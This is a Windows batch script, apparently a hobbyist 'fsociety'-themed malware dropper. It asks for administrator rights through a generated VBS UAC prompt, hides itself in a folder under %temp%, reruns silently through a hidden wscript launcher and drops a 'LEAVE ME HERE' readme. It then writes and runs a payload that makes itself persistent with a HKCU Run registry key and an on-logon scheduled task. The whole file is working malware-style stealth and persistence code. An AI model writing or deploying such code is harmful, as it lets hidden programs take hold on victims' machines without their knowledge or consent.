@echo off
:: checks if its running as admin or not and if it isn't it will restart and run it as admin using  a vbs script
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /b
)
:: target directory for fsociety00 its gonna be in temp mainly cuz thats where alot of malware hides
set "targetDir=%localappdata%\temp\fsociety00"
cd %userprofile%\appdata\local\temp
if not exist "fsociety00" (
    mkdir fsociety00
)
:: opens to the directory after creation
cd fsociety00
if "%~1"=="-silent" goto :main
echo Set WshShell = CreateObject("WScript.Shell") > "run.vbs"
echo WshShell.Run chr(34) ^& "%~f0" ^& chr(34) ^& " -silent", 0 >> "run.vbs"
echo Set WshShell = Nothing >> "run.vbs"
start wscript.exe "run.vbs"
exit /b
:: Readme.txt file just like the fsociety lol
:main
echo -----readme.txt----- > readme.txt
echo. >> readme.txt
echo LEAVE ME HERE >> readme.txt
echo. >> readme.txt
echo -----readme.txt----- >> readme.txt
:: The actual fsociety00 cmd payload script whatever
echo @echo off > fsociety00.cmd
echo reg query "hkcu\software\microsoft\windows\currentversion\run" /v fsociety00 ^>nul 2^>^&1 >> fsociety00.cmd
echo if %%errorlevel%% neq 0 ( >> fsociety00.cmd
echo     reg add "hkcu\software\microsoft\windows\currentversion\run" /v fsociety00 /t REG_SZ /d "wscript.exe \"%%localappdata%%\temp\fsociety00\run.vbs\"" /f ^>nul 2^>^&1 >> fsociety00.cmd
echo ) >> fsociety00.cmd
echo schtasks /query /tn fsociety00 ^>nul 2^>^&1 >> fsociety00.cmd
echo if %%errorlevel%% neq 0 ( >> fsociety00.cmd
echo     schtasks /create /tn "fsociety00" /tr "wscript.exe \"%%localappdata%%\temp\fsociety00\run.vbs\"" /sc onlogon /f ^>nul 2^>^&1 >> fsociety00.cmd
echo ) >> fsociety00.cmd
echo Set WshShell = CreateObject("WScript.Shell") > run.vbs
echo WshShell.Run chr(34) ^& "%targetDir%\fsociety00.cmd" ^& chr(34), 0 >> run.vbs
echo Set WshShell = Nothing >> run.vbs
start /b "" "%targetDir%\fsociety00.cmd"
exit /b
